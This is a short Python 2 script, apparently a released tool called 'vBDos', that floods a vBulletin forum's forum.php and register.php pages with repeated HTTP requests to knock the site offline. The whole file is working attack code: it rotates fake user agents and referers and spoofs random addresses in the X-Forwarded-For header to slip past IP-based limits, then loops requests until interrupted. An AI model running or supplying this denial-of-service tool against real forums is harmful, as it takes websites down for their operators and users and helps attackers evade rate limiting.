#!/usr/bin/python
##############
## Advisory: http://www.internot.info/forum/showthread.php?t=434&p=1278#post1278
##############
# MegaManSec #
##############
##############
#  InterNot  #
##############
import urllib2, threading
import sys, time
import random
from random import randint

th = 1
x = 0


try:
    sys.argv[1]
except IndexError:
    print "vBDos by MegaManSec"
    print "www.internot.info"
    print "USAGE: %s http://www.link.to/forum/" % sys.argv[0]
    sys.exit(0)
print "vBDos by MegaManSec"
print "www.internot.info"
print "Attacking %sforum.php" % sys.argv[1]







randomrefer = [
'http://www.google.com/',
'http://www.gmail.com/',
'http://www.yahoo.com/'
]

randomurl = [
"%sforum.php" % sys.argv[1],
"%sregister.php" % sys.argv[1]
]

randomagents = [
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
'Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0',
'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27'
]

def randip():
    i = [randint(1,255) for z in range(4)]
    return '%s.%s.%s.%s' % tuple(i)

def randagent():
     word = random.choice(randomagents)
     return '%s' % word

def randrefer():
     refer = random.choice(randomrefer)
     return '%s' % refer

def randurl():
     raurl = random.choice(randomurl)
     return '%s' % raurl

class Flood(threading.Thread):
    def __init__(self):
        self.killed = False
        threading.Thread.__init__(self)
    def run(self):
        global x
        global url
        while not self.killed:
            try:
                req_headers = {
                'Connection': 'Keep-Alive',
                'Keep-Alive': 'timeout=60',
                'User-Agent': randagent(),
		#some web-servers use X-Fowarded-For instead of IP address. so might aswell.
                'X-Forwarded-For' : randip(),
                'Referer' : randrefer()}
                req = urllib2.Request(randurl(),headers=req_headers)
                urllib2.urlopen(req)
                x += 1
            except (KeyboardInterrupt,ValueError):
                return None
            except urllib2.URLError:
                return None
for i in range(th):
    Flood().start()
while True:
    try:
                print 'looped %s times\r' % x,
    except KeyboardInterrupt:
        for th in threading.enumerate():
            th.killed = True
        time.sleep(1)
        sys.exit('Interrupted')

